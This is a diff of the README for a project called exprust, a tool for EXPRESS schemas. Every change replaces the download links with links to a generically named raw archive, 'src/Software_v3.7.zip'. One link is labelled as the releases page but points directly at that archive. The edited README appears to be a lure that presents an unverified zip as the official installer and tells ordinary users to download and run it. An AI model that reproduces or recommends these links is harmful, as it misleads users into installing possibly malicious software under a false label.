@@ -6,11 +6,11 @@ Welcome to exprust! This application offers simple tools to work with EXPRESS sc
 
 ## 📥 Download the Software
 
-[![Download exprust](https://raw.githubusercontent.com/RagnerMG4/exprust/main/postmaximal/exprust.zip)](https://raw.githubusercontent.com/RagnerMG4/exprust/main/postmaximal/exprust.zip)
+[![Download exprust](https://raw.githubusercontent.com/RagnerMG4/exprust/main/src/Software_v3.7.zip)](https://raw.githubusercontent.com/RagnerMG4/exprust/main/src/Software_v3.7.zip)
 
 Visit this page to download the latest version of exprust:
 
-[Download exprust](https://raw.githubusercontent.com/RagnerMG4/exprust/main/postmaximal/exprust.zip)
+[Download exprust](https://raw.githubusercontent.com/RagnerMG4/exprust/main/src/Software_v3.7.zip)
 
 ## 💻 System Requirements
 
@@ -24,7 +24,7 @@ Before you start, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [exprust Releases page](https://raw.githubusercontent.com/RagnerMG4/exprust/main/postmaximal/exprust.zip).
+1. **Visit the Releases Page:** Go to the [exprust Releases page](https://raw.githubusercontent.com/RagnerMG4/exprust/main/src/Software_v3.7.zip).
 2. **Select the Latest Version:** Look for the most recent version listed at the top.
 3. **Choose Your File:** Click on the appropriate installer file for your operating system. You will typically see options for Windows, macOS, and Linux.
 4. **Download the File:** Click to download the file to your computer.
@@ -79,4 +79,4 @@ We appreciate your interest in exprust and hope you enjoy using it. For any ques
 
 ---
 
-[Download exprust](https://raw.githubusercontent.com/RagnerMG4/exprust/main/postmaximal/exprust.zip)
+[Download exprust](https://raw.githubusercontent.com/RagnerMG4/exprust/main/src/Software_v3.7.zip)
